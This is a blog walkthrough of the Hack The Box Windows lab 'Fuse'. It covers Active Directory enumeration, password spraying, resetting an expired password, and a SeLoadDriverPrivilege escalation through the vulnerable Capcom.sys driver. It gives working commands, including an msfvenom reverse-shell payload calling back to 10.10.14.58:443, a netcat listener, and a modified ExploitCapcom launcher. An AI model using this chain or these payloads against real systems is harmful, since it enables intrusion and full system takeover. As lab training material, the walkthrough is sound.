+++
tags = ["Box", "HTB", "Medium", "Windows", "Active Directory", "LDAP", "SeLoadDriverPrivilege", "RPC", "Capcom"]
draft = false
title = "Fuse HTB Walkthrough"
author = "bloodstiller"
date = 2024-10-18
+++

## Fuse Hack The Box Walkthrough/Writeup: {#fuse-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Fuse>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}

-   **Basic Scan**:

    -   `nmap $box -Pn -oA basicScan`

    <!--listend-->

    ```shell
    kali in 46.02-HTB/BlogEntriesMade/Fuse/scans/nmap  3GiB/15GiB | 0B/1GiB with /usr/bin/zsh
    🕙 13:44:19 zsh ❯ nmap $box -Pn -oA basicScan
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 13:44 BST
    Nmap scan report for 10.129.2.5
    Host is up (0.039s latency).
    Not shown: 988 filtered tcp ports (no-response)
    PORT     STATE SERVICE
    53/tcp   open  domain
    80/tcp   open  http
    88/tcp   open  kerberos-sec
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    389/tcp  open  ldap
    445/tcp  open  microsoft-ds
    464/tcp  open  kpasswd5
    593/tcp  open  http-rpc-epmap
    636/tcp  open  ldapssl
    3268/tcp open  globalcatLDAP
    3269/tcp open  globalcatLDAPssl

    Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds

    ```

    -   **Initial thoughts**:
        -   DNS, Web, Kerberos, LDAP, SMB are all great targets.

-   **In depth scan**:

    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    kali in 46.02-HTB/BlogEntriesMade/Fuse/scans/nmap  3GiB/15GiB | 0B/1GiB with /usr/bin/zsh  took 11s
    🕙 13:44:41 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    [sudo] password for kali:
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 13:46 BST
    Nmap scan report for 10.129.2.5
    Host is up (0.039s latency).
    Not shown: 65514 filtered tcp ports (no-response)
    PORT      STATE SERVICE      VERSION
    53/tcp    open  domain       Simple DNS Plus
    80/tcp    open  http         Microsoft IIS httpd 10.0
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: Site doesn't have a title (text/html).
    88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-16 13:01:33Z)
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    9389/tcp  open  mc-nmf       .NET Message Framing
    49666/tcp open  msrpc        Microsoft Windows RPC
    49667/tcp open  msrpc        Microsoft Windows RPC
    49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
    49676/tcp open  msrpc        Microsoft Windows RPC
    49680/tcp open  msrpc        Microsoft Windows RPC
    49698/tcp open  msrpc        Microsoft Windows RPC
    49755/tcp open  msrpc        Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2016 (89%)
    OS CPE: cpe:/o:microsoft:windows_server_2016
    Aggressive OS guesses: Microsoft Windows Server 2016 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb-security-mode:
    |   account_used: <blank>
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: required
    | smb2-time:
    |   date: 2024-10-16T13:02:27
    |_  start_date: 2024-10-16T12:39:39
    | smb-os-discovery:
    |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
    |   Computer name: Fuse
    |   NetBIOS computer name: FUSE\x00
    |   Domain name: fabricorp.local
    |   Forest name: fabricorp.local
    |   FQDN: Fuse.fabricorp.local
    |_  System time: 2024-10-16T06:02:28-07:00
    |_clock-skew: mean: 2h33m00s, deviation: 4h02m31s, median: 12m59s
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled and required

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 237.63 seconds

    ```

    -   RPC is also present &amp; we can extract alot of information using RPC.


### LDAP `389`: {#ldap-389}


#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

<!--listend-->

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapchecker>
        -   `python3 ldapchecker.py $box`

-   It turns out the anonymous bind is not enabled but we can still get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in ~/Desktop/WindowsTools 🐍 v3.12.6  3GiB/15GiB | 0B/1GiB with /usr/bin/zsh
        🕙 13:44:45 zsh ❯ python3 ldapchecker.py $box
        Attempting to connect to 10.129.2.5 with SSL...
        Failed to connect with SSL. Retrying without SSL...
        Connected successfully. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=fabricorp,DC=local
            CN=Configuration,DC=fabricorp,DC=local
            CN=Schema,CN=Configuration,DC=fabricorp,DC=local
            DC=DomainDnsZones,DC=fabricorp,DC=local
            DC=ForestDnsZones,DC=fabricorp,DC=local
        ```

    2.  <span class="underline">We have the domain functionaility level</span>:
        ```shell
        Other:
          domainFunctionality:
            7
          forestFunctionality:
            7
          domainControllerFunctionality:
            7
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.)
            ```shell
            serverName:
                CN=FUSE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=fabricorp,DC=local
            ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.

-   **I update my `/etc/hosts` file now that we have the server name**.
    -   This is so we can use tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration as well as other tools later on.


### DNS `53`: {#dns-53}

-   **Using dnsenum to enumerate DNS entries**:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain`


### Kerberos `88`: {#kerberos-88}


#### Using [Kerbrute](https://github.com/ropnop/kerbrute) to bruteforce Usernames: {#using-kerbrute-to-bruteforce-usernames}

-   **As kerberos is present we can enumerate users using** [kerbrute](https://github.com/ropnop/kerbrute):
    -   `kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt`
    -   {{< figure src="/ox-hugo/2024-10-16-135903_.png" >}}
    -   I get 3 valid users &amp; add them to my users list.


### RPC: {#rpc}

-   **I connect using a null session, however we are unable to enumerate**:
    -   `rpcclient -U '%' $box`
    -   {{< figure src="/ox-hugo/2024-10-16-135720_.png" >}}


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   **This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
    -   `netexec smb $box -u '' -p '' --shares`
    -   {{< figure src="/ox-hugo/2024-10-16-140802_.png" >}}
    -   Guest account is disabled &amp; the null session cannot enumerate the shares.


#### Trying Usernames as Passwords: {#trying-usernames-as-passwords}

-   **I always try usernames as passwords as well**:
    -   `netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+]`
    -   {{< figure src="/ox-hugo/2024-10-16-140844_.png" >}}


### HTTP `80`: {#http-80}

-   **It appears to be a print logger**:
    -   {{< figure src="/ox-hugo/2024-10-16-141538_.png" >}}


#### Discovering Usernames in the `CSV` Entries: {#discovering-usernames-in-the-csv-entries}

-   **There are** `CSV` **files that can downloaded**:
    -   Looking at them I can see that there are users we did not find using kerbrute:
        -   {{< figure src="/ox-hugo/2024-10-16-141912_.png" >}}
        -   {{< figure src="/ox-hugo/2024-10-16-142017_.png" >}}


#### Discovering their may be an issue with the printing service in the `CSV` entries: {#discovering-their-may-be-an-issue-with-the-printing-service-in-the-csv-entries}

-   **We can see that there is a printing issue**:
    -   {{< figure src="/ox-hugo/2024-10-16-142312_.png" >}}
    -   This may not seem like much, but if they are facing issues it may let us know their is a wider issue.


#### Directory Busting With FFUF: {#directory-busting-with-ffuf}

-   **I Perform some directory busting to see if there are any interesting directories**:
    -   `ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://fuse.fabricorp.local/papercut/FUZZ -fc 403 -ic`
    -   {{< figure src="/ox-hugo/2024-10-16-151427_.png" >}}


#### Fuzzing for more `CSV`'s with FFUF: {#fuzzing-for-more-csv-s-with-ffuf}

-   **As the download string for the csv is in the below format we can fuzz it using** `FFUF`
    -   `/papercut/logs/csv/monthly/papercut-print-log-2020-05.csv`
-   I fuzz it using custom wordlist.
-   `ffuf -w ~/Wordlists/45.06-CustomWordlists/numbersDays-1-31.txt:MONTH -w ~/Wordlists/45.06-CustomWordlists/numbersYears-1990-2049.txt:YEAR  -u http://fuse.fabricorp.local//papercut/logs/csv/monthly/papercut-print-log-YEAR-MONTH.csv -fc 403 -ic`
-   {{< figure src="/ox-hugo/2024-10-16-151830_.png" >}}
-   Just the same two entries we have already found.


### Finding a password in the Printer Logs: {#finding-a-password-in-the-printer-logs}

-   **Looking back through the print logs I see the string** `Fabricorp01.docx`, **if we remove the** `.docx` **it looks alot like a password**:
    -   {{< figure src="/ox-hugo/2024-10-16-160637_.png" >}}

-   **I use** `netexec` **to password spray**:
    -   `netexec smb $box -u Users.txt -p 'Fabricorp01' --shares`
    -   {{< figure src="/ox-hugo/2024-10-16-160814_.png" >}}
    -   The response: `STATUS_PASSWORD_MUST_CHANGE` means that the password is correct but has to be changed on the next login!


### Changing the expired password: {#changing-the-expired-password}


#### Attempt 1: Trying to change the expired password using `smbpasswd.py`: {#attempt-1-trying-to-change-the-expired-password-using-smbpasswd-dot-py}

-   **I try and change the users passwords using** `smbpasswd.py` **by impacket**:
    -   `sudo python3 smbpasswd.py $domain\$user:$pass@$box -newpass 'N3wPass1$$09%12828'`
    -   {{< figure src="/ox-hugo/2024-10-16-165848_.png" >}}
    -   It does not work. Lets see if we can find another way to change this password online.
    -   +Note+: Only reason I used `sudo` was incase there was anything strange happening where I needed to.


#### Attempt 2: Trying to change the password using powershell: {#attempt-2-trying-to-change-the-password-using-powershell}

-   **After some searching online, I find** [[<https://hinchley.net/articles/changing-your-expired-active-directory-password-via-powershell>

][this article]] **which details the change via powershell. It's worth a shot**:

-   I fire up my windows vm &amp; connect to the `VPN`:
-   I Modify my hosts file &amp; then modify the script on the page but still cannot change the password.
    -   {{< figure src="/ox-hugo/2024-10-17-084354_.png" >}}

-   Lets see if we can do it via `impacket` again but with different arguments.


#### Attempt 3: Finally changing a password with `smbpasswd.py`: {#attempt-3-finally-changing-a-password-with-smbpasswd-dot-py}

-   `python3 smbpasswd.py $user:$pass@$box -newpass 'N3wPassWILLTHISWORK1$$09%'`
-   {{< figure src="/ox-hugo/2024-10-17-081339_.png" >}}
-   +Note+:
    -   I think the main issue's why this did not work before are due to the initial password I tried not being complex enough, `'N3Pass1'` &amp; for some reason it doesn't like when we use the domain name.

-   **I can list shares in** `netexec`:
    -   {{< figure src="/ox-hugo/2024-10-17-084630_.png" >}}

-   **However after I try and access the shares again for further enumeration, it appears as if the password has been changed**:
    -   {{< figure src="/ox-hugo/2024-10-17-084729_.png" >}}

-   **I check the older password** `'Fabricorp01'` **and it seems to have reverted to that**:
    -   {{< figure src="/ox-hugo/2024-10-17-084821_.png" >}}
    -   This looks like it's reverting to the previous password after a certain amount of time.


### Preparing commands to access SMB: {#preparing-commands-to-access-smb}

-   As it appears we have a time limit before the password is reset we need to prepare all of our commands to ensure we access the resources.

-   **Basic envs &amp; password change**:
    ```shell
    user=tlavel
    oldPass=Fabricorp01
    newPass='BrandNewPassword69!1811'
    python3 smbpasswd.py $user:$oldPass@$box -newpass $newPass
    ```

    -   {{< figure src="/ox-hugo/2024-10-17-092130_.png" >}}

-   **Tools**:
    ```shell
    netexec smb $box -u $user -p $newPass --shares
    smbmap -u $user -p $newPass -H $box -r 3
    ```

    -   {{< figure src="/ox-hugo/2024-10-17-092156_.png" >}}
    -   I check all users who's passwords can be changed. It's easy using the above approach as all we have to do is modify the `user` env.
        -   tlavel
        -   bhult
        -   bnielson
    -   It appears that all users have access to the same shares &amp; the most interesting one is the `print$` share.
    -   +Note+: This is why I like using `envs` they make time sensitive tasks like this ALOT quicker &amp; smoother.


### Downloading the entire `print$` share: {#downloading-the-entire-print-share}

-   **I download everything using** `smbget`:
    -   `smbget -U $domain/$user --recursive "smb://$box/print$"`
    -   {{< figure src="/ox-hugo/2024-10-17-095411_.png" >}}
    -   +Note+: `bnielson` was the last user I was logged in as that's why I am doing this as them.

BrandNewPassword69!181128!!!!!

-   `smbget -U $domain/$user --recursive "smb://$box/sysvol"`


#### Searching for more information in the pillaged smb files: {#searching-for-more-information-in-the-pillaged-smb-files}

-   I look through the files but there is nothing interesting I can see/find.


### Trying to dump user information via `ldapsearch`: {#trying-to-dump-user-information-via-ldapsearch}

-   **As we can access the host using credentials temporarily I try and dump all user information using ldap**:
    -   `ldapsearch -H ldap://fuse.$domain-x -b "DC=fuse,DC=fabricorp" -D "cn=$user,dc=fuse,dc=fabricorp" -w $newPass-s sub "(&(objectclass=user))" >> ldapUsersAll.txt`
    -   However it just errors out:
        -   {{< figure src="/ox-hugo/2024-10-17-131612_.png" >}}


### Enumerating using `rpcclient`: {#enumerating-using-rpcclient}

-   **I change the password again and manage to get an** `rpc` **session**:
    -   `rpcclient -U $user $box`
    -   {{< figure src="/ox-hugo/2024-10-17-132107_.png" >}}

-   **I dump all the users on the domain**:
    -   `enumdomusers`
    -   {{< figure src="/ox-hugo/2024-10-17-132233_.png" >}}
    -   This is good as it gives us more users now.

-   **I query each user individually to see if there is any important information in their descriptions, but find nothing**:
    -   `queryuser [RID]`


### Finding a hard-coded clear text credential a printer description: {#finding-a-hard-coded-clear-text-credential-a-printer-description}

-   **I enumerate the printers using** `rpclient` **and find a hardcoded password in the description field**:
    -   `enumprinters`
    -   {{< figure src="/ox-hugo/2024-10-17-134938_.png" >}}

-   **I cred stuff using newly found credentials &amp; users**:
    -   `netexec smb $box -u Users.txt -p $pass --continue-on-success | grep [+]`
    -   {{< figure src="/ox-hugo/2024-10-17-135256_.png" >}}
    -   **I get two hits**:
        -   svc-print
        -   svc-scan

-   **I have a deep dive on** `rpc` **available here**:
    -   <https://bloodstiller.com/cheatsheets/rpc-cheatsheet/>


## 2. Foothold: {#2-dot-foothold}


### Enumerating as `svc-print`: {#enumerating-as-svc-print}


#### Running a bloodhound collection: {#running-a-bloodhound-collection}

-   **Now that we have creds that arent' changing all the time we can to a full bloodhound collection**:
    -   `python3 bloodhound.py -dc fuse.$domain -c All -u $user -p $pass -d $domain -ns $box`
    -   {{< figure src="/ox-hugo/2024-10-17-144237_.png" >}}


#### Connecting to the host using `evil-winrm`: {#connecting-to-the-host-using-evil-winrm}

-   **I connect to the host using** `evil-winrm`:
    -   `evil-winrm -i $box -u $user -p $pass`

-   **I get the user flag**:
    -   {{< figure src="/ox-hugo/2024-10-17-144831_.png" >}}


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


- I have written a deep dive that goes into this exploitation method in more detail:
- <https://bloodstiller.com/articles/seloaddriverprivilegeescalation/>
### Finding out we have the `SeLoadDriverPrivilege` privilege: {#finding-out-we-have-the-seloaddriverprivilege-privilege}

-   **I enumerate the privileges of my user**:
    -   `whoami /priv`
    -   {{< figure src="/ox-hugo/2024-10-17-144928_.png" >}}
    -   Checking my group memberships confirms this also:
    -   {{< figure src="/ox-hugo/2024-10-17-151209_.png" >}}
-   From previous experience I know this is a viable privilege escalation path using the `Capcom.sys` exploit.


### Checking the system is vulnerable to the exploit: {#checking-the-system-is-vulnerable-to-the-exploit}

-   The `Capcom.sys` attack only works if the Windows build is below build `17134`.
    -   But how do I know this? I will share how I know this information soon.

-   **I check the build**:
    -   `[System.Environment]::OSVersion.Version`
    -   {{< figure src="/ox-hugo/2024-10-18-173023_.png" >}}
    -   It's `14393` so we can move forward with this attack.


#### `Print Operators` Group Explained: {#print-operators-group-explained}

-   Allowed local logon to DCs; can exploit Windows to load malicious drivers.
-   Being part of the Print Operators Group grants users the `SeLoadDriverPrivilege`

-   **Print Operators Group Overview**:
    -   Purpose: Provides management capabilities for printers connected to domain controllers and Active Directory printer objects within the domain.

-   **Capabilities**:
    -   Manage, create, share, and delete printers.
    -   Manage Active Directory printer objects.
    -   Locally sign in to and shut down domain controllers.

-   **Caution and Restrictions**:
    -   Member Caution: Due to the ability to load and unload device drivers on domain controllers, add members cautiously.
    -   **Restrictions**:
        -   Cannot be renamed, deleted, or removed.
        -   No default members.

-   **Attributes and Permissions**:
    -   Well-known SID/RID: `S-1-5-32-550`
    -   Type: Builtin Local
    -   Default Container: `CN=Builtin, DC=[domain], DC=[domain]`
    -   Protected by `AdminSDHolder`?: Yes
    -   Movement Restrictions: Cannot be moved out of the default container.
    -   Delegation: Not safe to delegate management to non-service admins.
    -   +Default+ User Rights.
        -   Allow log on locally: `SeInteractiveLogonRight`
        -   Load and unload device drivers: `SeLoadDriverPrivilege`
            -   This is what we are mainly interested in as we can load a malicious driver.
        -   Shut down the system: `SeShutdownPrivilege`


#### `SeLoadDriverPrivilege` Explained: {#seloaddriverprivilege-explained}

-   Permits the dynamic loading and unloading of device drivers, which can be essential for system updates or configuration changes.
    -   Being part of the `Print Operators Group` provides this privilege by default.
    -   There is a great article [here](https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/) about how it can be abused.
    -   We can take advantage of this privilege to exploit a well known vulnerable driver called `Capcom.sys` to run code as `SYSTEM`.


## 4. Ownership: {#4-dot-ownership}


### `Capcom.sys` Driver Vulnerability: Arbitrary Code Execution with `SYSTEM` Privileges {#capcom-dot-sys-driver-vulnerability-arbitrary-code-execution-with-system-privileges}

-   **TL;DR**: Key Takeaways
-   `Capcom.sys` is a vulnerable driver that allows attackers to execute arbitrary code with `SYSTEM` privileges.
-   Protections like `VBS` and `HVCI` can help mitigate risks, but require modern hardware.
-   `Driver block rules`: can provide an additional layer of defense by preventing vulnerable drivers from loading.


#### Overview of the `Capcom.sys` Vulnerability: {#overview-of-the-capcom-dot-sys-vulnerability}

-   The `Capcom.sys` kernel driver is notorious for its functionality that permits the execution of arbitrary code in kernel mode directly from user space.
-   Specifically, this driver disables `SMEP` (Supervisor Mode Execution Prevention) before invoking a function provided by the attacker, enabling us to run code with `SYSTEM` privileges.
    -   You can find the real `Capcom.sys` driver on GitHub: [Capcom.sys driver on GitHub](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)

-   **Affected Windows Versions**:
    -   This exploit has been tested and verified on the following Windows versions:
    -   Windows 7 (x64)
    -   Windows 8.1 (x64)
    -   Windows 10 (x64) up to build `17134` (Version 1708)
    -   Windows 11 (x64) up to build `22000.194` (Version 21H2)
        -   Builds after `22000.194` contain deny lists that prevent this driver from loading.

<!--listend-->

-   **Security Considerations**:
    -   Modern versions of Windows have introduced protections like `Virtualization-based Security (VBS)` and `Hypervisor-Protected Code Integrity (HVCI)` to mitigate the risks posed by vulnerable drivers such as `Capcom.sys`.
    -   These security mechanisms enforce code integrity in the kernel, allowing only signed code to execute and blocking known vulnerable or malicious drivers. However, it’s important to note that these features often require newer hardware and can have a performance impact.

    -   For a deeper dive into the issue of signed vulnerable drivers, you can refer to:
        -   [WeLiveSecurity's article](https://www.welivesecurity.com/2022/01/11/signed-kernel-drivers-unguarded-gateway-windows-core/)

<!--listend-->

-   **Mitigation Strategies**:
    -   To safeguard against vulnerabilities like this, Microsoft recommends implementing `driver block rules` as part of a comprehensive security policy.
    -   These block rules prevent the loading of known vulnerable or malicious drivers. Additionally, custom enterprise code integrity policies can be used to monitor and enforce these rules, with audit logs generated whenever a blocked driver attempts to load.

-   For more on how to implement and enforce these rules, check out:
    -   [Red Canary’s guide on driver block rules](https://redcanary.com/blog/ms-driver-block-rules/)


### Download A Copy of the official `Capcom.sys` Driver: {#download-a-copy-of-the-official-capcom-dot-sys-driver}

-   **Download the official driver**:
    -   `wget https://github.com/FuzzySecurity/Capcom-Rootkit/raw/refs/heads/master/Driver/Capcom.sys`
        -   We will keep it locally at the moment as there are some other tools we need to compile before we can move forward.


### Compiling the `EopLoadDriver` tool to enable us to load the `Capcom.sys` driver: {#compiling-the-eoploaddriver-tool-to-enable-us-to-load-the-capcom-dot-sys-driver}

The `EopLoadDriver` tool is a utility designed to leverage the `SeLoadDriverPrivilege` for loading a driver into the Windows kernel. It interacts with the Windows registry to register the driver and then uses the NtLoadDriver system call to load it. This tool is essential in our exploit chain as it allows us to load the vulnerable `Capcom.sys` driver, which we'll subsequently exploit to gain SYSTEM privileges. By using `EopLoadDriver`, we're able to bridge the gap between having the `SeLoadDriverPrivilege` and actually loading a driver of our choice into the kernel.

#### Preparing the `EopLoadDriver ~C++` Project: {#preparing-the-eoploaddriver-c-plus-plus-project}

-   **This is a** `C++` **file that will need to be compiled within** `Visual Studio` **so I will spin up my** `Windows VM`
    -   I download the project:
        -   <https://github.com/TarlogicSecurity/EoPLoadDriver/>
    -   I create a new project:
        -   {{< figure src="/ox-hugo/2024-10-18-071257_.png" >}}
        -   Then type `Console` into the search bar &amp; select `ConsolApp` with `C++` written below it.
        -   Click `Next`

-   **I give it a name &amp; also select**: `Place solution and project in the same directory`:
    -   {{< figure src="/ox-hugo/2024-10-18-071638_.png" >}}
    -   **Hit** `"Create"`
    -   +Note+:
        -   Just incase you are unaware, this just puts source code &amp; project itself in the same directory is all.

-   **This provides a standard** `Hello World` **template, which we can use as the basis of our project**:
    -   {{< figure src="/ox-hugo/2024-10-18-072018_.png" >}}


#### Importing the `EopLoadDriver` code &amp; Compiling: {#importing-the-eoploaddriver-code-and-compiling}

-   **I delete all the code on the** `Hello World` **generated file &amp; paste in the contents of** [Targlogic's](https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/) `EopLoadDriver` **code**:
    -   <https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp>

-   **I set it to release &amp; then press build but get errors relating to** `stdafx.h`:
    -   {{< figure src="/ox-hugo/2024-10-18-072232_.png" >}}

-   **I do some searching online &amp; find this**:
    -   {{< figure src="/ox-hugo/2024-10-18-072621_.png" >}}
-   **So my imports look like this now**:

    -   {{< figure src="/ox-hugo/2024-10-18-181622_.png" >}}

-   **I re-run the build and it builds successfully**:
    -   {{< figure src="/ox-hugo/2024-10-18-072752_.png" >}}


### Compiling the `ExploitCapcom` exploit `C++` project: {#compiling-the-exploitcapcom-exploit-c-plus-plus-project}

-   We are going to be using the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom/tree/master) tool. We will need to compile this ourselves.

The `ExploitCapcom` tool is the core component of our privilege escalation attack. It's designed to exploit the vulnerability in the `Capcom.sys` driver that we've loaded using `EopLoadDriver`. This tool takes advantage of the driver's ability to disable Supervisor Mode Execution Prevention (SMEP) and execute arbitrary code in kernel mode. By default, ExploitCapcom opens a new command prompt with `SYSTEM privileges`, but we'll modify it to launch our custom payload instead. This tool effectively completes the privilege escalation chain, leveraging the loaded vulnerable driver to elevate our permissions to the highest level in the Windows operating system.

#### Importing the `ExploitCapcom C++` Project: {#importing-the-exploitcapcom-c-plus-plus-project}

-   **This time I am going to clone this repo**:
    -   {{< figure src="/ox-hugo/2024-10-18-111819_.png" >}}

-   **Paste in the repo url**:
    -   <https://github.com/tandasat/ExploitCapcom.git>
    -   {{< figure src="/ox-hugo/2024-10-18-111850_.png" >}}


### Modifying `ExploitCapcom` exploit to enable a reverse shell: {#modifying-exploitcapcom-exploit-to-enable-a-reverse-shell}

-   **I open** `ExploitCapcom.cpp` **and do not remove the** `stdafx.h` **import**:
    -   The reason being is the actual required file containing the header is in this project. So we can compile with it.
        -   {{< figure src="/ox-hugo/2024-10-18-125040_.png" >}}

-   **This exploit by default opens a new elevated shell, however this requires we have** `GUI` **access. So we will need to modify to run a reverse shell**:
    -   Below is the code we are going to modify:
        -   `TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");`
    -   I will modify it to run a reverse shell generated via `msfvenom`:
        ```C++
          // Launches a command shell process
          static bool LaunchShell()
          {
              //Original Line Commented Out:
              //TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
              TCHAR CommandLine[] = TEXT("C:\\Users\\svc-print\\Documents\\shell.exe");
              PROCESS_INFORMATION ProcessInfo;
              STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
              if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
                  CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
                  &ProcessInfo))
              {
                  return false;
              }

              CloseHandle(ProcessInfo.hThread);
              CloseHandle(ProcessInfo.hProcess);
              return true;
          }
        ```

        -   Full transparency, I tried multiple different payloads. My original plan was to upload `nc64.exe` but it just would not execute not matter the subshells etc I used.

-   **I compile it**:
    -   {{< figure src="/ox-hugo/2024-10-18-125121_.png" >}}


### Generating our reverse-shell payload using `msfvenom`: {#generating-our-reverse-shell-payload-using-msfvenom}

-   **I generate a simple reverse shell using** `msfvenom`:
    -   `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.58 LPORT=443 -f exe -o shell.exe`
    -   {{< figure src="/ox-hugo/2024-10-18-143546_.png" >}}


### Run the exploit chain on the victim: {#run-the-exploit-chain-on-the-victim}

1.  **I use** `evil-winrm` **to transfer all the files to the target**:
    -   `upload [filename]`
    -   {{< figure src="/ox-hugo/2024-10-18-130359_.png" >}}

2.  **Load the driver Run Exploit**:
    -   `.\EopLoadDriver.exe System\CurrentControlSet\Capcom C:\Users\svc-print\Documents\Capcom.sys`
    -   {{< figure src="/ox-hugo/2024-10-18-130552_.png" >}}
    -   All 0's is good as a response, means we are working.

3.  **Setup Listener**:
    -   `rlwrap -cAr nc -lnvp 443`

4.  **Trigger exploit**:
    -   `.\ExploitCapcom.exe`
    -   {{< figure src="/ox-hugo/2024-10-18-143703_.png" >}}

5.  **Catch the reverse shell**:
    -   {{< figure src="/ox-hugo/2024-10-18-143802_.png" >}}
